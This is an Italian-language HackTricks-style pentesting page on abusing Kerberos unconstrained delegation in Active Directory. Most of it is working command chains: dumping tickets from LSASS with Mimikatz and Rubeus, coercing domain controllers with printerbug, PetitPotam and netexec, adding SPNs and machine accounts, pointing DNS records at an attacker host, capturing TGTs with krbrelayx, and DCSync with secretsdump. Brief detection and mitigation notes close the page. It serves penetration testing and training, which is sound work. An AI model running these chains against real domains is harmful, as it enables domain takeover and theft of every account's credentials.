# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Questa è una funzionalità che un Domain Administrator può impostare su qualsiasi **Computer** all'interno del dominio. Dopodiché, ogni volta che un **utente effettua l'accesso** al Computer, una **copia del TGT** di quell'utente verrà **inviata all'interno del TGS** fornito dal DC e **salvata in memoria in LSASS**. Quindi, se disponi di privilegi di Administrator sulla macchina, potrai **dumpare i ticket e impersonare gli utenti** su qualsiasi macchina.

Pertanto, se un Domain Administrator effettua l'accesso a un Computer con la funzionalità "Unconstrained Delegation" attivata e disponi di privilegi di amministratore locale su quella macchina, potrai dumpare il ticket e impersonare il Domain Administrator ovunque (domain privesc).

Puoi **trovare gli oggetti Computer con questo attributo** verificando se l'attributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puoi farlo con un filtro LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, come fa powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Carica in memoria il ticket di Administrator (o dell'utente vittima) con **Mimikatz** o **Rubeus per un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Maggiori informazioni: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Maggiori informazioni sulla Unconstrained delegation su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Forzare l'autenticazione**

Se un attaccante riesce a **compromettere un computer autorizzato per "Unconstrained Delegation"**, può **indurre** un **server di stampa** ad **autenticarsi automaticamente** verso di esso, **salvando un TGT** nella memoria del server.\
L'attaccante potrebbe quindi eseguire un **attacco Pass the Ticket per impersonare** l'account computer del server di stampa dell'utente.

Per fare in modo che un server di stampa si autentichi verso qualsiasi macchina, puoi usare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Se il TGT proviene da un domain controller, puoi eseguire un [**attacco DCSync**](acl-persistence-abuse/index.html#dcsync) e ottenere tutti gli hash dal DC.\
[**Maggiori informazioni su questo attacco su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Qui trovi altri modi per **forzare un'autenticazione:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Funziona anche qualsiasi altro primitive di coercion che induca la vittima ad autenticarsi con **Kerberos** verso il tuo host con unconstrained delegation. Negli ambienti moderni questo spesso significa sostituire il classico flusso PrinterBug con **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** o una coercion basata su **WebClient/WebDAV**, a seconda della superficie RPC raggiungibile.

### Abuso di un account utente/servizio con unconstrained delegation

Unconstrained delegation **non è limitata agli oggetti computer**. Anche un **account utente/servizio** può essere configurato con `TRUSTED_FOR_DELEGATION`. In questo scenario, il requisito pratico è che l'account riceva ticket Kerberos di servizio per uno **SPN che possiede**.

Questo porta a 2 percorsi offensivi molto comuni:

1. Comprometti la password/hash dell'**account utente** con unconstrained delegation, quindi **aggiungi uno SPN** allo stesso account.
2. L'account ha già uno o più SPN, ma uno di questi punta a un **hostname obsoleto/dismesso**; ricreare il **record DNS A** mancante è sufficiente per dirottare il flusso di autenticazione senza modificare l'insieme di SPN.<sup>[[8]](#references)</sup>

Flusso Linux minimo:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Note:

- Questo è particolarmente utile quando il principal con delega unconstrained è un **service account** e hai solo le sue credenziali, non la possibilità di eseguire codice su un host aggiunto al dominio.
- Se l'utente target ha già uno **SPN obsoleto**, ricreare il **record DNS** corrispondente può generare meno rumore rispetto ad aggiungere un nuovo SPN in AD.
- Le tecniche recenti incentrate su Linux usano `addspn.py`, `dnstool.py`, `krbrelayx.py` e una primitiva di coercion; non è necessario accedere a un host Windows per completare la catena.

### Abusare della Unconstrained Delegation con un computer creato dall'attaccante

I domini moderni spesso hanno `MachineAccountQuota > 0` (valore predefinito: 10), consentendo a qualsiasi principal autenticato di creare fino a N oggetti computer. Se disponi anche del privilegio token `SeEnableDelegationPrivilege` (o di diritti equivalenti), puoi configurare il computer appena creato affinché sia considerato trusted per la unconstrained delegation e acquisire i TGT in ingresso dai sistemi con privilegi elevati.<sup>[[1]](#references)</sup>

Flusso a grandi linee:

1) Crea un computer sotto il tuo controllo

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Rendere risolvibile il nome host falso all'interno del dominio

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Abilitare la delega non vincolata sul computer controllato dall'attaccante

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Perché funziona: con la unconstrained delegation, l'LSA di un computer con delega abilitata memorizza nella cache i TGT in entrata. Se induci un DC o un server privilegiato ad autenticarsi al tuo host falso, il suo TGT macchina verrà memorizzato e potrà essere esportato.

4) Avvia krbrelayx in modalità export e prepara il materiale Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Forza l'autenticazione dal DC/server al tuo host fasullo

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx salverà i file ccache quando una macchina esegue l'autenticazione, ad esempio:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Usa il TGT acquisito della macchina DC per eseguire DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Note e requisiti:

- `MachineAccountQuota > 0` consente la creazione di computer da parte di utenti non privilegiati; altrimenti servono autorizzazioni esplicite.
- Per impostare `TRUSTED_FOR_DELEGATION` su un computer è necessario `SeEnableDelegationPrivilege` (o essere domain admin).
- Assicurati che la risoluzione dei nomi punti al tuo host falso (record DNS A), in modo che il DC possa raggiungerlo tramite FQDN.
- La coercion richiede un vettore praticabile (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, ecc.). Se possibile, disabilitali sui DC.
- Se l’account vittima è contrassegnato come **"Account is sensitive and cannot be delegated"** o appartiene a **Protected Users**, il TGT inoltrato non verrà incluso nel service ticket e quindi questa catena non consentirà di ottenere un TGT riutilizzabile.<sup>[[9]](#references)</sup>
- Se **Credential Guard** è abilitato sul client/server che effettua l’autenticazione, Windows blocca **Kerberos unconstrained delegation**; questo può far fallire, dal punto di vista dell’operatore, percorsi di coercion altrimenti validi.

Idee per il rilevamento e l’hardening:

- Genera un alert per gli Event ID 4741 (account computer creato) e 4742/4738 (account computer/utente modificato) quando è impostato `TRUSTED_FOR_DELEGATION` in UAC.
- Monitora l’aggiunta di record DNS A insoliti nella zona del dominio.
- Fai attenzione a picchi di eventi 4768/4769 provenienti da host inattesi e ad autenticazioni dei DC verso host non-DC.
- Limita `SeEnableDelegationPrivilege` a un insieme minimo di account, imposta `MachineAccountQuota=0` dove possibile e disabilita Print Spooler sui DC. Applica la firma LDAP e il channel binding.

### Mitigazione

- Limita gli accessi DA/Admin a servizi specifici
- Imposta "Account is sensitive and cannot be delegated" per gli account privilegiati.

## References

- [1] [HTB: Delegate — credenziali SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync per ottenere DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Compromissione del dominio tramite unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork di CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Gruppo di sicurezza Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Compromissione del dominio tramite print server DC e Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
